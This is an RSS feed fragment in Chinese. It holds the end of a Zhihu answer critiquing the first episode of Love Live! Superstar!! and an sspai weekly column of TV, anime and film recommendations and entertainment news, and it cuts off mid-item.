data-private-watermark-src=\"v2-386caa54ff009731f08fe9c8a266e65b\"></p>\n<p>在之后切入到正式时间线里之后，一开始对于香音自己的介怀，对于躺平而绷不住的心态都也很到位，这一种将个人属性与矛盾作为剧情端口的想法我觉得很不错，即使是里面穿插了其他个人的剪影也挺合理，我真的一度感觉按照这样的突破，进一步地发扬虹咲时期对于偶像团体中个人性的调整，其实是一个挺不错比较合理的安排，既有新鲜感，又不算是没有其他类型作品的范式，但是，本作第一集迈出的这样一步也很大程度上在文本量面前扑了街。</p>\n<p>我当然能理解香音这个角色就属于是那种本质上超爱音乐，但是有一个桎梏没过过去，陷入到了的愈加自我否定与对自己精神属性怀疑的情况，到时候指不定比谁都高精神属性的角色；我也知道这种角色确实很可能是最有可能找到一个节点就突破的角色。但是本作在有虹色游击队前三集试图将重建与雪菜个人回结合，然后由于文本量没办法应对同时把重建计划中的群像面与雪菜个人部分讲好，最后把本作的第三集整成了前半程最不行的单集的前车之鉴的情况下，星团居然“百尺竿头更进一步”，直接第一集就一鼓作气就把香音这个疑似PTSD治好了，顺带着还就是唐可可说句鸡汤就走几脚就好了，啊这......</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9581b40a39295e75f54ae6705752ff25_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-9581b40a39295e75f54ae6705752ff25\" data-watermark-src=\"v2-803969dfa6960f55d6937e39223f9177\" data-private-watermark-src=\"v2-f8eb324f1e75dae2aaf6930666863d10\"></p>\n<p>于此处有着相当类似性的大概是虹团ep1里面步梦第一次入部纠结之后的台阶特效唱歌，那一段按照我昨天重新过了一遍的感觉来说，就第一集来看也是一样的仓促感，这一点印象中我在评价虹团第一集的想法时也有提到，但是当时毕竟一方面虹团的特效部分确实值得赞赏，另一方面事后诸葛亮的来看，这里只是一个分号，还没有到达爆点，存在的问题也只是犹疑而不是从小到大的PTSD级别怯场。</p>\n<p>从文本对象来看，此处解决的问题其实与爱马仕本家的雪步有着相当的相似程度，且不谈我个人觉得第一次雪步个人回的下乡演出带来的解决方法也不太行，但是人家整个单集的起承转合与几次沟通的情绪与效用，都远比现在第一集的tkk那种真空形象说几句似是而非的话来着更有感觉。而不是像现在星团这样子在第一集单薄的文本量与人物形象之下，以一种过于莫名的情绪来一股劲铆足就克服了，这很不对劲的</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e4c81c01cbf45fb2133f9efe964c3176_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-e4c81c01cbf45fb2133f9efe964c3176\" data-watermark-src=\"v2-d722fa63f4c8c4eed93237f04c3a0b9a\" data-private-watermark-src=\"v2-181f28be2ff75a58530523e88061401e\"></p>\n<p>所以从我个人的安排来说，我可能更希望把本集断在香音出门抬头听到tkk练声那里，把之前的沟通进一步扩容和增加情绪，后面再给香音纠结的部分更多篇幅与演出，然后将本集收尾的部分放在下一集中后期。同时我也希望此处的爽朗感不要就这样一下就脱胎换骨，后续不但其他地方可以多玩玩冷面帅逼要素，而且后面在什么正式一点的表演、比赛的时候建议再次因为这个出问题，然后花田大老师给一个比“不要放弃啊”更高级的回答。</p>\n<p><b>不过毕竟这都是商业企划，能骗人进llas就成功（草，千万不要这样啊！）</b></p>\n<h3><b>3.鲤鱼，此刻最大的短板，却不只是她的问题</b></h3>\n<p>不论是鲤鱼粉，鲤鱼黑亦或是摩天轮魔怔人，我们都不得不承认，鲤鱼确实很大程度上让星团的讨论热度远超其企划本身在国内的讨论热度，这一点大约大棋党，国际资本改造人会觉得意义重大，但笔者虽然键政远多于动画，但是现在只想提动画部分。</p>\n<p>从笔者的感受来说，高情商地说，鲤鱼的日语配音除去语速峰值也就只能适应动画配音这种语速，一到大喘气的时候就音色尖锐，对于国内观众来说也没有什么不适感;低情商地说，鲤鱼的中文配音水平不如其日语配音水平。第一段中文配音部分如果还能因为那种腻歪感还能因为过去传言/谣言的部分怀疑音响相关是不是把国语配音等于了台版配音，第二段的配音就能表明鲤鱼的国语配音水平确实真不行以及真没有当成台配，那种急了只是把语速加快到含糊不清，然后中文的语气词还要拖长音的说话方式，真不是国人正常说话方式。反倒是香音那一段“小笼包”居然更加字正腔圆一点。而且从LL企划下的中文直播方面，昨天鲤鱼直播的直播效果，一句话读三次的尴尬感，讲道理在我看来真不如在油管上同样日中混合直播的LLAS里面钟岚珠的CV，在广东读过几年小学的法元明菜应对自然，业务水平嘛，我就只说这么多了。</p>\n<a href=\"https://www.zhihu.com/video/1398717493972819969\">星团唐可可第二段中文配音</a><p>但是，鲤鱼的业务水平部分虽然国人肯定会更敏感，但是唐可可这个角色的微妙感，在我看来鲤鱼也就占两三成比例，就第一集来看，我觉得唐可可最大的微妙在于其定位的尴尬。上一部分我提到，星团的第二个创新就是把leader与宣传机器脱钩，而在这个过程中，确实带来了香音这样一个非典型LL核心，但是在这样的切割之下，第一集的唐可可，除去塑料日语与塑料汉语打架，就只剩下不停地和喜之郎经典广告一样重复着“我想当学园偶像”“你要不要当学园偶像”，属实让人怀疑她家是不是以前是在权健上班的。而且更微妙的问题在于，当立德与宣传者，初始的动议者进行切割之后，综使本集为唐可可安排了开导香音的部分，但是这一部分在第二部分所介绍的微妙感与极度匮乏的文本量下，就很难让我觉得这里确实能开导成功，进而更加加重了笔者对于鲤鱼/唐可可德不配位的怀疑。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9d258aec23101897a1fc870a085902f7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-9d258aec23101897a1fc870a085902f7\" data-watermark-src=\"v2-861155e8296740955b8a39b40ef6dcdf\" data-private-watermark-src=\"v2-46e24c9c1c1e7b5a23795a3fa55114c2\"></p>\n<p>如果说，唐可可这个形象除去不开口的时候还有什么时候是令我期待的，大约本集中那个唐可可日记里面那一段歌词确实是大亮点</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d17b43b0ecc0bd8ac7c02c18a9aac4b0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-d17b43b0ecc0bd8ac7c02c18a9aac4b0\" data-watermark-src=\"v2-40fbdc93b36d1ca93ee9a028813b3bcc\" data-private-watermark-src=\"v2-349b3f417a04278ce79c242b0ff2e4a8\"></p>\n<p>这一点不只是因为此处歌词确确实实比她那两段配音都要更加标准汉语，更重要的是这里让我还能抱有期待花田有可能在唐可可的中国身份上做文章，而没有彻彻底底把唐可可当成一个套模板的一般路过乐天派狂热工具人，这一点我觉得如果未来有安排唐可可的个人单回，那这里写得好是很有可能能在国内风评方面一举大提升，也是在2018年优秀表现之后花田又一次有机会逆转一下的重要部分。</p>\n<p>最后拿一点小想象来收尾这一部分，唐可可在第一集中一说“自己就是为了当学园偶像来日本的”，我的脑子里一下子想起来几年前在阿批看到的上海地铁的lovelive痛车，想到了拿上海地铁报站音剪的缪斯歌曲的鬼畜，再想了想唐可可的年龄段，或许她就是这样因为小时候在地铁站邂逅了那一班地铁而成为了LLer吧。</p>\n<p>真希望后面唐可可的剧情，能够在对于上海在ACG方面居于国内的特殊性，能够在更加充分地了解中国的前提下，真正的用好混血留学生的设定，把这个角色真正丰满成一个完整的人。</p>\n<h3><b>4.其他与总结</b></h3>\n<p>总的来说，对于本作的第一集，笔者虽然说了五千多字这些东西，看起来也不算是多好的评价，但是笔者也没有觉得第一集多么不行，甚至一定程度上因为人设与美术方面的虹色改造而感觉初见观感非常可以。</p>\n<p>我对本作有不少的担心，也基本上没想过本作能和虹团与田中仁那样能够带来许多不同于lovelive传统的新感受，但大概本作也不至于太糟糕</p>\n<p>至少这一次，“感谢”东京奥运会，喜提工期+3 weeks，大概有可能会让绘柄更稳定点，让化用卡面与游戏的灵活运用之外能够在演出上有不愧于这个企划的成果</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fc33b3a16d8bb00430bb9eaa5556310f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"1506\" data-watermark=\"original\" data-original-src=\"v2-fc33b3a16d8bb00430bb9eaa5556310f\" data-watermark-src=\"v2-f62b1d3d5d5a99bc1ad77febc9f525c1\" data-private-watermark-src=\"v2-711af401741635a9b54275a9b8f47676\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/akode-hong?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Ako的红</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/471564130/answer/1998229747?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">26 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/29681781?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《LoveLive!》有什么有意思的二设？</a><br><a href=\"http://www.zhihu.com/question/34555301?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">对于动画宅来说，Love Live! 提供了什么其他动画作品没提供的新感受？</a><br>\n","link":"http://www.zhihu.com/question/471564130/answer/1998229747?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"本周看什么丨最近值得一看的 6 部作品","date":"2021-07-16 09:53:14","description":"\n<h2>TL;DR</h2>\n<ul>\n<li>近期佳作推荐：[美剧] 非典型少年 第四季、[纪录片] 我在敦煌、[动画] 漂流少年、[日剧] TOKYO MER～移动的急救室～、[韩剧] 直到疯狂、[美剧] 都市侠盗：救赎</li>\n<li>几则精彩预告：皮克斯《青春变形记》公布预告，2022 年上映、《猎魔人》第二季及动画电影将登陆 Netflix、电影《长津湖》发布首款预告、滨口龙介新作《驾驶我的车》发布全新预告</li>\n<li>几则影视资讯：电影《沙丘》确认引进，档期待定、张震加盟 Netflix 新剧《苏里南》、《X 特遣队：全员集结》8 月 6 日同步登陆北美院线及 HBO Max、小罗伯特·唐尼将与朴赞郁合作新剧《同情者》、北京电影节正式公布「合力生光」主题海报</li>\n<li>特别预告：「看什么雨天特辑」将在本周日发布，给大家带来七月盛夏的清凉！<br><a href=\"https://sspai.com/post/67716\" target=\"_blank\"><strong>看什么 · 特别篇丨让这张雷雨季的专属片单，来带你清凉一夏！</strong></a>\n</li>\n</ul>\n<h2>👀 N 部作品推荐</h2>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如有其他建议也欢迎在评论区提出，感谢大家对「看什么」栏目的喜爱和支持。</p>\n<h3>[美剧] 非典型少年 第四季（最终季）</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/6a60a63eb694bb99904c039d8bc3bf64\"></figure><p>关键词：剧情 / 喜剧</p>\n<p>片长：30 分钟（单集）× 10 集；<a href=\"https://movie.douban.com/subject/34973325/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>非典型少年在一次次的冒险之后，成长为了最好的自己。</p></blockquote>\n<p>@潘誉晗：剧集的主人公 Sam 是一位患有自闭症的少年，是一些人眼中的「异类」。他最喜欢的动物是企鹅，所以他经常幻想自己可以像企鹅一样在水底游泳，因为「藏」在水中，可以让他的内心感到平静，他也不需要去在乎他人的言论。好在 Sam 又是一个极其幸运的人，因为他拥有一群可爱的家人。</p>\n<p>这是一部可以让人在笑泪与共的同时感受到成长的喜剧，也和我以往看过的关于青春期的美剧很不一样。虽然关于自闭症的影视剧在现在来说已经很常见了，可本剧通过一个高能自闭症青少年寻找自己与爱的讲述，我们还是可以在大量台词爆发的能量背后感受到那种轻轻柔柔的爱，以及淡淡浅浅的小疼痛，不过这样的心疼是因为我们发现了这个故事最温暖的一面，那就是剧里的人们自始至终都在帮助这位少年，即使他是很多人眼中的非典型存在，可他依然被深深爱着。</p>\n<h3>[纪录片] 我在敦煌</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/b32e414ba06caf72c219b138535d9f56\"></figure><p>关键词：纪录片</p>\n<p>片长：38 分钟（单集）× 7 集 ；<a href=\"https://movie.douban.com/subject/35480588/\" target=\"_blank\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：敦煌是中华民族宝贵的非物质文化遗产，孕育了博大精深的敦煌文化，敦煌莫高窟、月牙泉、阳关、玉门关等无不让人心向往之，而在层层叠叠的黄沙之中，还藏着无数形形色色的敦煌人的人生。</p>\n<p>《我在敦煌》是一首关于敦煌平凡人和平凡事的赞颂歌，它聚焦心在敦煌、工作在敦煌、生活在敦煌的人们，记录敦煌那些哭与笑、生与死、信仰与激情的羁旅故事，讲述他们的平凡生活与信仰追求。他们中有因热爱敦煌文化而投身其中的年轻人，有莫高窟的守护者，还有世代居住于此的农耕原住民；他们有人一心追逐自己的梦想，有人甘心成为艺术的囚徒；他们是敦煌研究院雕塑师、文物修复师、壁画临摹师，为传承和弘扬敦煌文化默默坚守着。</p>\n<p>《我在敦煌》探究每个人心里的敦煌，探究敦煌和敦煌文化如何糅进他们骨血里，把敦煌透过一个又一个的人具象生动地表达出来，是很难得一见的人文视角切入点。</p>\n<h3>[动画] 漂流少年 / Sonny Boy</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/60c37315cc6f0449e3e5667143d037a0\"></figure><p>关键词：剧情 / 奇幻 / 冒险</p>\n<p>片长：24 分钟（单集）× 12 集，每周四更新</p>\n<p>观看渠道：<a href=\"https://www.youtube.com/playlist?list=PLxSscENEp7Jh5cTYOJ44AOGwWLAap7dCU\" target=\"_blank\">YouTube</a> / <a href=\"https://www.bilibili.com/bangumi/media/md28234650/\" target=\"_blank\">哔哩哔哩</a> （有删改）/ <a href=\"https://v.qq.com/x/cover/mzc00200jf1bctm.html\" target=\"_blank\">腾讯视频</a>（有删改）；<a href=\"https://movie.douban.com/subject/35427522/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>乌托邦与地狱的盛夏</p></blockquote>\n<p>@SHY：暑假过半的八月，长良、希等 36 名初中生突然随学校一同漂流至异次元，同时觉醒了各式各样的超能力。与外界隔绝、脱离现代社会的众人之中，出现了制定规则的领导者，也出现了运用异能肆意妄为的人，有拼死寻找回到原本世界方法的人，也有随波逐流满不在乎的人。无法克制的嫉妒心与支配欲引发了对立，难以解决的事件也接连发生，被扔进神秘空间的少年少女们，能否攻略未知的世界，平安重返日常？</p>\n<p>单看梗概，《漂流少年》的剧本并不新鲜，有种《<a href=\"https://book.douban.com/subject/1872158/\">蝇王</a>》混搭《<a href=\"https://book.douban.com/series/725\">漂流教室</a>》的既视感，而学生社会的设定稍有闪失，必将拖累全篇观感，最终评价可想而知。不过，从已播出的第一集来看，本作重心并非初中生政治或大逃杀，而是世界观解谜与青春期心理疏导，甚至可能是 Boy meets girl 的王道冒险。第一集的叙事同样可圈可点，20 分钟内数次转折，信息量与悬疑感拉满，单独抽出作为 OVA 也是较完整的故事，谨慎看好后续集数的展开。</p>\n<p>剧本之外，《漂流少年》的画面相当别致，主要采用纯色填充，简化阴影和背景元素，玻璃破裂等能力效果的设计令人印象深刻。结尾黑暗一扫而空、世界豁然开朗，男女主角手拉手坠入海洋的分镜浪漫至极，紧随其后的主题曲同样青春感十足。身兼导演、编剧数职的夏目真悟表示，这是一部类似「私小说」的作品，完全依照自己的喜好创作，整体留白较多，希望观众自由发挥想象。如果能对上主创的电波，必然是一部值得观看的动画。</p>\n<h3>[日剧] TOKYO MER～移动的急救室～</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/1db2fa8248407e587e69f24fbe7a8388\"></figure><p>关键词：剧情 / 动作</p>\n<p>片长：50 分钟（单集，首集增加 25 分钟）× 10 集；<a href=\"https://movie.douban.com/subject/35459108/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>傻乎乎光等待，是没有办法拯救生命的。</p></blockquote>\n<p>@潘誉晗：虽然本剧稍显冷门，但首集 14.1% 和第二集 14.3% 的收视率，以及网飞的支持，这部号称「陆地版《CODE BLUE》」的新剧集还是很值得推荐。</p>\n<p>剧集聚焦的主人团是一个名为「TOKYO MER」的专业急救团队，他们工作的地点是一辆有着最新医疗设备的大型移动车辆，在这里甚至可以为伤员进行专业的手术，只要接到任务，他们便可以迅速赶到事故或灾害现场进行紧急处理。和日本青春型医疗剧一对比，TBS 明显专业很多。剧中全套的医疗设备，经验高超的救护人员，让观众能够切实感受到超燃的氛围。</p>\n<p>除了剧情之外，这一次配置的卡司也很值得关注。团队的队长是由铃木亮平饰演的急救医生喜多见幸太，而人气演员贺来贤人所饰演的精英音羽尚则和喜多见医生站在不同的立场上，剧中的派系相争也很有看点。值得一提的是，由「牙医」GReeeeN 演唱的主题曲也为本剧增色不少。</p>\n<h3>[韩剧] 直到疯狂</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/27f4b43aef7f45f33fe48a6b88823ba6\"></figure><p>关键词：剧情</p>\n<p>片长：60 分钟（单集）× 16 集 ；<a href=\"https://movie.douban.com/subject/35274809/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>中年版未生</p></blockquote>\n<p>@宇宙浪费指南：《直到疯狂》是一部非常反映现实生活的职场剧，讲述 35+ 岁的中年上班族们为了在经历剧变的职场社会中生存而「疯狂」工作的故事。</p>\n<p>东亚三国在竞争激烈和职场危机问题上步调还是一致的，韩国多数都取消了终生雇佣制度，采用使用大量派遣员工的方式以节省人力成本，另一方面则是大量裁员，像我国某企业一样「释放人才给社会」，简称裁员，如果不愿意离职，则会被调整到闲散的岗位，简称逼人离职，就像剧里的男主崔畔锡，中年的他为了女儿和房屋贷款，无论如何被刁难，都要先留下来。</p>\n<p>剧中，崔畔锡曾经带领团队，获得过科技设计方面的大奖，技术实力相当过关，却被迫接受公司调岗的决定。他在技术上的经验优势却在新领导面前一文不值，不会解读职场气氛的他被领导穿小鞋，像扔垃圾一样把他丢到人事部。女主是人事部的领导，她最主要的工作之一就是劝员工主动离职，办事滴水不漏，但看起来很没人情味，在自己的专业、公司的利益与人情之间的平衡，她看似做得不错。</p>\n<p>中年人的职场没有那么单纯，不仅需要专业能力，还有内部竞争与站队，而面对新时代与老技术之间的关系，「疯狂」工作，不断提升自己融入新气象的职场，向上管理，向上竞争，或许才是中年人的生存之道。剧集不光让我们真实体会到中年人的职场心酸，也能在自己的职场生活中获得一些启发。</p>\n<h3>[美剧] 都市侠盗：救赎</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/21cfaa2fac52e2c6dda558d72be797ac\"></figure><p>关键词：悬疑 / 惊悚 / 犯罪</p>\n<p>片长：50 分钟（单集）× 16 集；<a href=\"https://movie.douban.com/subject/35049314/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>性格不同的侠盗们，却组成了最温暖的家庭～</p></blockquote>\n<p>@潘誉晗：在这次重启的故事中，时间线设定在上一个任务结束之后。八年过去，社会变化很大，虽然老大没能回归，但这个团队也渐渐发展成了跨国集团。因此，为了更好地适应社会的发展，也为了更好地完成任务，团队加入了两名新的成员。曾经当过律师的新人强调了司法的重要性，而另一位天才工程师则利用自己的技术操纵媒体舆论。可以说，两位新角色的加入不仅增加了剧情上的亮点，也展现了法律和舆论在当今生活中越来越举足轻重的地位。</p>\n<p>十年前追剧的记忆似乎还历历在目，也曾遗憾爽剧就这样戛然而止，没想到八年后的今天竟然等来了《都市侠盗》的重启。虽然之前的男主角因为负面新闻无法回归，但是除他以外团队的所有成员全部回归已经是足够震撼的惊喜，难怪这样的消息和新闻让剧集的粉丝惊呼「有生之年」，并且在烂番茄得到了 93% 的新鲜度——这群疯子们又回来了！</p>\n<h3>✌️更多</h3>\n<p><a href=\"https://movie.douban.com/subject/35367501/\" target=\"_blank\">[美剧] 神话任务 第二季</a> @潘誉晗：作为 APPLE TV+ 的首部情景喜剧，因名字误导所以劝退了很多观众还是觉得挺遗憾的。其实这部剧讲述的是一个游戏制作公司的故事。团队选择用情景喜剧的方式展示游戏背后那些不为人知的故事。第二季延续了第一季轻松的风格，而且在 Collider 评选出的今年上半年最佳剧集中取得了第八名的好成绩。</p>\n<p><a href=\"https://movie.douban.com/subject/34927983/\" target=\"_blank\">[台剧] 神之乡</a> @宇宙浪费指南 ：本剧改编自同名漫画，以桃园大溪为故事舞台，讲述离家多年的大学生夏志薰，在大三暑假回到了睽违七年的故乡桃园大溪，在过程中逐渐找回遗忘的童年，并逐步解开与家人间的多年心结的故事。电视剧开场以大溪热闹的社会场景展开，展现了当地的宗教文化，也描述在现代化发展飞速的今天，年轻人和故乡之间的情感联结，从更大的角度来说，这部剧也是在讲述传统文化与时代发展之间的适应与磨合。</p>\n<p><a href=\"https://movie.douban.com/subject/35488810/\" target=\"_blank\">[日剧] 孤独的美食家 第九季</a> @潘誉晗：时隔一年，我们再次迎来了《孤独的美食家》，也再次拥有了下饭的最佳拍档。看到这个又高又瘦的叔又可以在镜头前随着战歌展示自己令人惊叹的胃口，观众们对于这部长寿剧的喜爱依然不减当年。「什么是健康意识？能这样大口大口吃油炸食品，就是我健康的证明！」确实，享受当下的美食是最重要的事～</p>\n<p><a href=\"https://movie.douban.com/subject/35512568/\" target=\"_blank\">[纪录片] 谁杀了调查记者</a> @Voyager_1：谁能控制过去，谁就能控制未来。谁能控制现在，谁就能控制过去。片子讲述了曼努尔·布恩迪亚的记者生平，他于 1984 年在墨西哥城的办公室外惨遭杀害。纪录片借助旧时的影像资料、同辈人的采访、甚至是真实案发现场的模型，试图还原布恩迪亚遭遇的一切，并借此探讨记者揭露真相的代价以及新闻的真实价值和意义。</p>\n<p><a href=\"https://movie.douban.com/subject/35457539/\" target=\"_blank\">[日剧] 紧急审讯室 第四季</a> @潘誉晗：永远不会背叛我们的天海佑希领着大叔们在《紧急审讯室》第四季华丽回归了。这部围绕着审讯展开的刑侦剧，是通过和嫌疑人在审讯室中的斡旋展开的，而在一次次斗智斗勇中，真相也被一点点揭晓。霸气、智慧又冷静的女王，一群毒舌却合作默契的老头子们，审讯室的日常搞笑，这季依然上演着。</p>\n<p><a href=\"https://movie.douban.com/subject/35194575/\" target=\"_blank\">[德剧] 生物黑客 第二季 </a>@潘誉晗：上一季女主角虽然成功曝光了非法生物科技的存在，可是首季最后的结局还是吊足了大家的胃口。时隔一年，第二季的线索埋得更深了，有更关键的幕后黑手在操纵，而以这个立场出发的剧情也因此变得更令人期待。虽然这一季的节奏没有上一季紧凑，但是整体的完成度还是相当不错，就是科幻感比上季少了。</p>\n<h3>吐槽区</h3>\n<p><a href=\"https://movie.douban.com/subject/35135955/\" target=\"_blank\">[国产剧] 北辙南辕</a> @宇宙浪费指南 ：一直拍电影的冯小刚导演终于「下凡」来拍电视剧了，女性群像虽是近年热门话题，但却没有亮眼作品，再加上冯导的圈内人脉使得很多大咖坐镇，所以这部剧在播出前就备受期待，而让我如此愤怒地来吐槽，也是因为落差实在太大。剧情除了黄渤老师那段讽刺「数字小姐」的演技，没有一处值得表扬，剧情极为悬浮，人设极为刻板印象，五个女主角仿佛活在云端，台词又北京味浓厚，又贫又接地气，看得我十分分裂。有钱人自由快乐的生活与当代女性困境，恕我见识短浅，实在无法在剧里联系到一起，也很难体会到导演对普通人困境的洞察和关怀，他不懂女性，也不懂普通人，名导大咖加持也难掩剧本单薄破烂，而观众再也不需要这种打着「女性主义」旗帜的烂剧了。</p>\n<p><a href=\"https://movie.douban.com/subject/35513258/\" target=\"_blank\">[印尼剧] 佳履奇缘</a> @Voyager_1：故事讲述一段由鞋子引发的算不上奇妙的缘分。因为算命的缘故女主意外光顾到男主的鞋店，却因为换鞋的过程和男友发生误会，转而开始和男主见面、约会，几个冲突后解决冲突，最后走到一起。由于元素和景点太过丰富，总是莫名的出戏，推动剧情的地方往往几句对白一笔带过，当成印尼风土人情旅游观光来看可能更为合适。</p>\n<h2>📅 本周新预告</h2>\n<h3>皮克斯《青春变形记》公布预告，2022 年上映</h3> <p>7 月 13 日，皮克斯公布了新作动画电影《青春变形记》（Turning Red，暂译）的首支预告，由短篇动画《包宝宝》导演石之予执导、编剧，2022 年 3 月 11 日在北美上映，内地档期待定。中学生李美琳总会因母亲的过度保护而在日常生活中陷入尴尬境地，并在情绪失控时化身一只巨大的红色小熊猫，故事由此展开。</p>\n<h3>《猎魔人》第二季及动画电影将登陆 Netflix</h3> <p>7 月 10 日举行的 WitcherCon 直播活动中，CD Projekt RED 与 Netflix 介绍了《猎魔人》IP 的多项新作进展。影视方面，《猎魔人》真人剧集第二季将于 12 月 17 日上线，共 8 集，游戏《巫师 3：狂猎》也将推出免费联动 DLC；动画电影《猎魔人：狼之噩梦》8 月 23 日上线，讲述杰洛特师傅维瑟米尔的故事。</p>\n<h3>电影《长津湖》发布首款预告</h3> <p>7 月 12 日，电影《长津湖》发布首款预告。该片由黄建新担任总监制及编剧，陈凯歌、徐克、林超贤担任监制及导演，吴京、易烊千玺、段奕宏、朱亚文、李晨、韩东君等主演，将于 2021 年全国上映。</p>\n<h3>滨口龙介新作《驾驶我的车》发布全新预告</h3> <p>7 月 10 日，根据村上春树短篇小说集《没有女人的男人们》改编，由滨口龙介执导，西岛秀俊、三浦透子、冈田将生、雾岛丽香主演的电影《驾驶我的车》发布全新预告。该片已入围第 74 届戛纳电影节主竞赛单元，将于 8 月 20 日日本公映。</p>\n<h3>更多</h3>\n<p><a href=\"https://www.bilibili.com/video/BV1SV411H7h9?share_source=copy_web\" target=\"_blank\"><strong>阿彼察邦·韦拉斯哈古执导、蒂尔达·斯文顿主演电影《记忆》首曝预告：</strong></a>由阿彼察邦·韦拉斯哈古执导，贾樟柯联合监制，蒂尔达·斯文顿、让娜·巴利巴尔、丹尼尔·希梅内斯·卡乔主演的电影《记忆》发布首支预告。该片已入围第 74 届戛纳电影节主竞赛单元。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Ho4y1D7ov?from=search&amp;seid=11382209626664935111\" target=\"_blank\"><strong>《摩登情爱》第二季 8 月 13 日登陆亚马逊 Prime Video：</strong></a>《摩登情爱》第二季发布正式预告。导演约翰·卡尼回归监制，安娜·帕奎因、露西·宝通、基特·哈灵顿、托比亚斯·门基斯、加内特·赫德兰等主演。第二季共 8 集，将于 8 月 13 日登陆亚马逊 Prime Video。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1gv411n7Uv?from=search&amp;seid=4893837860582768480\" target=\"_blank\"><strong>HBO Max 剧集《泰坦》第三季发布正式预告：</strong></a>《泰坦》第三季发布正式预告，神奇小子阵亡，布鲁斯·韦恩隐退，迪克·格雷森带着泰坦重归哥谭，罗宾杰森·托德将在本季遭遇不测，并化身红头罩向蝙蝠侠复仇。本季的泰坦们将在哥谭集结，与老友重聚的同时也将面对新的威胁。本季将于 8 月 12 日在 HBO Max 播出，开播首日一次性放出三集，之后每周四更新一集。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1kB4y1T7mE?from=search&amp;seid=4081270539754240187\" target=\"_blank\"><strong>武侠古装电视剧《雪中悍刀行》发布新预告</strong></a>：本片改编自烽火戏诸侯同名小说，宋晓飞执导， 王倦编剧，张若昀、胡军、李庚希、高伟光、张天爱主演，将于今年播出。讲述一位世家子弟徐凤年历经磨难最终成长为北凉王的故事。</p>\n<h2>📽 影视新闻周报</h2>\n<h3>电影《沙丘》确认引进，档期待定</h3>\n<p>7 月 13 日，科幻电影《沙丘》确认引进内地，档期尚未公布。本作改编自弗兰克·赫伯特同名小说的前半部分，由《银翼杀手 2049》丹尼斯·维伦纽瓦执导，与艾瑞克·罗斯、乔·斯派茨共同编剧，10 月 22 日北美公映，同时登陆 HBO Max。原著被公认为史上最伟大的科幻作品之一，主要讲述少年保罗·厄崔迪的英雄之旅。 <a href=\"https://weibo.com/7412351656/KoweE5BnU\" target=\"_blank\">来源</a></p>\n<h3>张震加盟 Netflix 新剧《苏里南》</h3>\n<p>7 月 15 日，据媒体报道，张震加盟出演 Netflix 新剧《苏里南》。该剧共 6 集，由《特工》《与犯罪的战争：坏家伙的全盛时代》导演尹钟彬执导，卡司包括河正宇、黄政民、赵宇镇、秋瓷炫、朴海秀、柳演锡等。目前该剧已在首尔开拍。</p>\n<h3>《X 特遣队：全员集结》8 月 6 日同步登陆北美院线及 HBO Max</h3>\n<p>7 月 10 日，詹姆斯·古恩执导的《X 特遣队：全员集结》发布全新海报。影片卡司包括玛格特·罗比、伊德瑞斯·艾尔巴、约翰·塞纳、乔尔·金纳曼、 杰·科特尼、维奥拉·戴维斯、彼得·卡帕尔迪、艾莉丝·布拉加等。该片将于 8 月 6 日同步登陆北美院线及 HBO Max。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/16/article/6ee1a6c20bb7716024bd48fcb43542a0\"></figure><h3>小罗伯特·唐尼将与朴赞郁合作新剧《同情者》</h3>\n<p>7 月 16 日，据媒体报道，小罗伯特·唐尼将主演由朴赞郁执导，A24 开发的 HBO 